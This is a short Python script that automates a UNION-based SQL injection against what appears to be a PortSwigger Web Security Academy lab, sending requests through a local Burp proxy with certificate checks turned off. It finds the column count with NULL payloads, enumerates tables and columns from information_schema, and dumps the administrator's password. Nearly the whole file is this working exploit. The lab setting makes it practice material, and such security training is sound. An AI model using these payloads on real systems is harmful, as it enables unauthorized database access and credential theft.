# listing non-oracle dbms
from typing import Union
from urllib.parse import quote, quote_plus

import requests as r
import urllib3
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session: r.Session = r.Session()
console: Console = Console()

session.verify = False
print = console.print

session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def get_col_nums(URL, max_col=10):
    count = 1
    PAYLOAD = "' UNION SELECT "

    for _ in range(max_col):
        PAYLOAD += "NULL, "

        response: r.Response = session.get(URL + quote(PAYLOAD.strip(", ") + "--"))

        if response.status_code == 200:
            break

        count += 1
    else:
        return 0

    return count


def main() -> None:
    URL = "https://0a7d008303110c3c816da200006400df.web-security-academy.net/filter?category=Pets"

    # get tables with their schema names
    # PAYLOAD = (
    #     "' UNION SELECT "
    #     + ", ".join(
    #         (cols := ["table_name", "table_schema"])
    #         + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
    #     ).strip(", ")
    #     + " FROM  information_schema.tables WHERE table_schema NOT IN ('pg_catalog', 'information_schema')--"
    # )

    # get a particular table's columns names;
    # PAYLOAD = (
    #     "' UNION SELECT "
    #     + ", ".join(
    #         (cols := ["column_name", "NULL"])
    #         + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
    #     ).strip(", ")
    #     + " FROM information_schema.columns WHERE table_name = 'users_swvftc'--"
    # )

    # dump
    PAYLOAD = (
        "' UNION SELECT "
        + ", ".join(
            (cols := ["username_unjzya", "password_pntlii"])
            + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
        ).strip(", ")
        + " FROM public.users_swvftc WHERE username_unjzya = 'administrator'--"
    )

    response: r.Response = r.get(URL + PAYLOAD)
    print(response.text)
    print(response.status_code)


if __name__ == "__main__":
    main()
